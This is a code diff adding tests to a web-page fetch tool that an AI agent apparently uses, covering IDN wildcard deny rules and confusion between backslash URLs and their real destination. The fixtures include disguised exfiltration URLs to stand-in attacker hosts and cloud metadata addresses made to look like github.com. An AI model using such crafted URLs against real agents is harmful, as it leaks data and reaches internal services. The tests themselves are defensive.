@@ -88,7 +88,7 @@ class MockAgentNetworkFilterService implements IAgentNetworkFilterService {
 }
 
 suite('FetchWebPageTool', () => {
-	ensureNoDisposablesAreLeakedInTestSuite();
+	const disposables = ensureNoDisposablesAreLeakedInTestSuite();
 
 	test('should handle http/https via web content extractor and other schemes via file service', async () => {
 		const webContentMap = new ResourceMap<string>([
@@ -242,6 +242,49 @@ suite('FetchWebPageTool', () => {
 		}
 	});
 
+	test('blocks Unicode wildcard denied URLs before web content extraction', async () => {
+		const deniedUrls = [
+			'https://xn--bcher-kva.de/',
+			'https://sub.xn--bcher-kva.de/',
+			'https://xn--bcher-kva.de/private',
+			'https://sub.xn--bcher-kva.de/private',
+		];
+		const allowedUrl = 'https://example.com/allowed';
+		const webContentMap = new ResourceMap<string>(
+			deniedUrls.map(url => [URI.parse(url), 'Denied content'] as const)
+		);
+		webContentMap.set(URI.parse(allowedUrl), 'Allowed content');
+		const webContentExtractorService = new TestWebContentExtractorService(webContentMap);
+		const configService = new TestConfigurationService();
+		configService.setUserConfiguration(AgentNetworkDomainSettingId.NetworkFilter, true);
+		configService.setUserConfiguration(AgentNetworkDomainSettingId.AllowedNetworkDomains, ['*']);
+		configService.setUserConfiguration(AgentNetworkDomainSettingId.DeniedNetworkDomains, ['*.b\u00fccher.de']);
+		const networkFilterService = disposables.add(new AgentNetworkFilterService(configService));
+		const tool = new FetchWebPageTool(
+			webContentExtractorService,
+			new ExtendedTestFileService(new ResourceMap<string | VSBuffer>()),
+			new MockTrustedDomainService(),
+			new MockChatService(),
+			new TestContextService(),
+			networkFilterService,
+		);
+
+		const result = await tool.invoke(
+			{ callId: 'test-call-wildcard-idn', toolId: 'fetch-page', parameters: { urls: [...deniedUrls, allowedUrl] }, context: undefined },
+			() => Promise.resolve(0),
+			{ report: () => { } },
+			CancellationToken.None
+		);
+
+		assert.deepStrictEqual({
+			content: result.content.map(part => part.value),
+			requestedUris: webContentExtractorService.requestedUris.map(uri => uri.toString()),
+		}, {
+			content: [...deniedUrls.map(url => networkFilterService.formatError(URI.parse(url))), 'Allowed content'],
+			requestedUris: [allowedUrl],
+		});
+	});
+
 	test('should handle empty and undefined URLs', async () => {
 		const tool = new FetchWebPageTool(
 			new TestWebContentExtractorService(new ResourceMap<string>()),
@@ -337,6 +380,68 @@ suite('FetchWebPageTool', () => {
 		}, {
 			title: 'Fetch web page?',
 			confirmationNotNeededReason: undefined,
+		});
+	});
+
+	test('backslash URLs use the same destination for confirmation policy and extraction', async () => {
+		const urls = [
+			String.raw`https://evil.example\.github.com/collect?leak=<data>`,
+			String.raw`https://evil.example\\.github.com/collect?leak=<data>`,
+			String.raw`https://169.254.169.254\.github.com/latest/meta-data/`,
+			String.raw`https://169.254.169.254\\.github.com/latest/meta-data/`,
+			String.raw`http://127.0.0.2:38651\.github.com/exfil?data=fixture`,
+			String.raw`https://github.com\.evil.example/resource`,
+			String.raw`https://api.github.com/path\resource?query=\value#\fragment`,
+			'https://api.github.com/resource',
+		];
+		const destinationUris = urls.map(url => URI.parse(new URL(URI.parse(url).toString(true)).href));
+		const contents = new ResourceMap<string>();
+		for (const uri of [...urls.map(url => URI.parse(url)), ...destinationUris]) {
+			contents.set(uri, 'Fixture content');
+		}
+		const extractor = new TestWebContentExtractorService(contents);
+		const policyUris: string[] = [];
+		const networkFilter = new MockAgentNetworkFilterService();
+		networkFilter.isEnabled = () => false;
+		networkFilter.isUriAllowed = uri => {
+			policyUris.push(uri.toString(true));
+			return true;
+		};
+		const tool = new FetchWebPageTool(
+			extractor,
+			new ExtendedTestFileService(new ResourceMap<string | VSBuffer>()),
+			new MockTrustedDomainService([]),
+			new MockChatService(),
+			new TestContextService(),
+			networkFilter,
+		);
+		const preparations: { message: string | undefined; requestsBeforeInvocation: number }[] = [];
+		for (const [index, url] of urls.entries()) {
+			const preparation = await tool.prepareToolInvocation(
+				{ parameters: { urls: [url] }, toolCallId: `backslash-${index}`, chatSessionResource: undefined },
+				CancellationToken.None
+			);
+			preparations.push({
+				message: typeof preparation?.invocationMessage === 'string' ? preparation.invocationMessage : preparation?.invocationMessage?.value,
+				requestsBeforeInvocation: extractor.requestedUris.length,
+			});
+			await tool.invoke(
+				{ callId: `backslash-${index}`, toolId: InternalFetchWebPageToolId, parameters: { urls: [url] }, context: undefined },
+				() => Promise.resolve(0),
+				{ report: () => { } },
+				CancellationToken.None
+			);
+		}
+
+		const destinations = destinationUris.map(uri => uri.toString(true));
+		assert.deepStrictEqual({
+			preparations,
+			policyUris,
+			extractedUris: extractor.requestedUris.map(uri => uri.toString(true)),
+		}, {
+			preparations: destinations.map((url, index) => ({ message: `Fetching ${url}`, requestsBeforeInvocation: index })),
+			policyUris: destinations.flatMap(url => [url, url]),
+			extractedUris: destinations,
 		});
 	});
 
